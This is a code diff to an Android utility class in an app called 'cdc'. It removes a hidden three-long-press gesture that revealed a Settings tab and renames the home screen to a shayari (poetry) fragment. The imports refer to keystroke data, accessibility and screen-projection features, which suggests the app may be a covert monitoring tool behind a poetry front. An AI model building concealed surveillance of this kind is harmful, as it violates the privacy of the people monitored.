@@ -20,21 +20,11 @@ import android.location.LocationManager;
 import android.media.projection.MediaProjectionManager;
 import android.net.ConnectivityManager;
 import android.os.Build;
-import android.os.CountDownTimer;
-import android.os.Environment;
-import android.os.Handler;
 import android.os.PowerManager;
 import android.provider.Settings;
-import android.util.Log;
-import android.view.MotionEvent;
-import android.view.View;
-import android.widget.Toast;
-
-import androidx.appcompat.app.AppCompatActivity;
 
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
-import com.vikasyadavnsit.cdc.R;
 import com.vikasyadavnsit.cdc.constants.AppConstants;
 import com.vikasyadavnsit.cdc.data.AppUsageReportData;
 import com.vikasyadavnsit.cdc.data.KeyStrokeData;
@@ -43,10 +33,9 @@ import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
 import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
 import com.vikasyadavnsit.cdc.fragment.ClickActionsFragment;
-import com.vikasyadavnsit.cdc.fragment.HomeFragment;
+import com.vikasyadavnsit.cdc.fragment.ShayariFragment;
 import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
 import com.vikasyadavnsit.cdc.fragment.MessageFragment;
-import com.vikasyadavnsit.cdc.fragment.PlayFragment;
 import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
 import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
 import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
@@ -60,54 +49,10 @@ import java.util.TreeMap;
 
 public class ActionUtils {
 
-    private static Handler handler = new Handler();
-    private static boolean isLongPress = false;
-    private static boolean isCounting = false;
-    private static int pressCount = 0;
-    private static CountDownTimer countDownTimer;
     private static Activity context;
 
-    public static void handleButtonPress(AppCompatActivity activity) {
+    public static void setContext(Activity activity) {
         context = activity;
-
-        //Handle Button Presses
-        activity.findViewById(R.id.main_navigation_request_play_button).setOnClickListener(view -> {
-            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new PlayFragment());
-
-            // Todo : databaseutil will configure a reset functionality
-
-            //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
-        });
-
-        activity.findViewById(R.id.main_navigation_request_home_button).setOnClickListener(view -> {
-            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
-        });
-        activity.findViewById(R.id.main_navigation_request_settings_button).setOnClickListener(view -> {
-            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
-        });
-
-
-        //Handle Touch Listeners
-        activity.findViewById(R.id.main_navigation_request_home_button).setOnTouchListener(new View.OnTouchListener() {
-            @Override
-            public boolean onTouch(View v, MotionEvent event) {
-                switch (event.getAction()) {
-                    case MotionEvent.ACTION_DOWN:
-                        CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
-                        isLongPress = false;
-                        handler.postDelayed(settingEnablerRunnable, 3000); // 5 seconds
-                        return true;
-
-                    case MotionEvent.ACTION_UP:
-                    case MotionEvent.ACTION_CANCEL:
-                        if (!isLongPress) {
-                            handler.removeCallbacks(settingEnablerRunnable);
-                        }
-                        return true;
-                }
-                return false;
-            }
-        });
     }
 
     public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
@@ -202,8 +147,7 @@ public class ActionUtils {
     /**
      * Requests exact alarm permission on Android 12+ by opening the corresponding system settings.
      *
-     * <p>This uses the static {@link #context} set by {@link #handleButtonPress(AppCompatActivity)}
-     * to start the settings activity.</p>
+     * <p>Uses the static {@link #context} set by {@link #setContext(Activity)}.</p>
      */
     public static void requestExactAlarmPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -263,53 +207,6 @@ public class ActionUtils {
         }
     }
 
-    /**
-     * Runnable used by the hidden-gesture flow to reveal the Settings tab after repeated long presses.
-     *
-     * <p>Each time this runs, it increments {@code pressCount}. When {@code pressCount == 3}, the
-     * Settings navigation button is made visible. A countdown timer is started to reset the gesture
-     * window.</p>
-     */
-    private static Runnable settingEnablerRunnable = () -> {
-        isLongPress = true;
-        pressCount++;
-        // Check if the pressCount reaches 3 within 30 seconds
-        if (pressCount == 3) {
-            Toast.makeText(context, "Settings Tab Enabled", Toast.LENGTH_SHORT).show();
-            context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.VISIBLE);
-        }
-
-        // If the timer is not running, start the 30-second timer
-        if (!isCounting) {
-            startCountDown();
-        }
-    };
-
-    /**
-     * Starts/resets the countdown window for the hidden Settings unlock gesture.
-     *
-     * <p>When the timer finishes, if the required number of long presses wasn't met, Settings is
-     * hidden again and counters are reset.</p>
-     */
-    private static void startCountDown() {
-        isCounting = true;
-        countDownTimer = new CountDownTimer(20000, 1000) { // 30 seconds countdown
-            @Override
-            public void onTick(long millisUntilFinished) {
-                // No action needed on each tick
-            }
-
-            @Override
-            public void onFinish() {
-                isCounting = false;
-                if (pressCount < 3) {
-                    context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.GONE);
-                }
-                pressCount = 0; // Reset press count after 30 seconds
-            }
-        };
-        countDownTimer.start();
-    }
 
 
     /**
@@ -354,7 +251,7 @@ public class ActionUtils {
         LoggerUtils.d("ActionUtils", "Loading Shayari ..");
 
         if (shayaris == null || shayaris.isEmpty()) {
-            HomeFragment.updateShayariText(AppConstants.DEFAULT_SHAYARI_TEXT, 1, 1);
+            ShayariFragment.updateShayariText(AppConstants.DEFAULT_SHAYARI_TEXT, 1, 1);
             return;
         }
 
@@ -369,7 +266,7 @@ public class ActionUtils {
         int nextIndex = (lastIndex) % total;
         String shayari = shayaris.get(nextIndex);
 
-        HomeFragment.updateShayariText(shayari, nextIndex + 1, total);
+        ShayariFragment.updateShayariText(shayari, nextIndex + 1, total);
         SharedPreferenceUtils.updateShayariData(context, (nextIndex + 1) + ":" + total);
     }
 
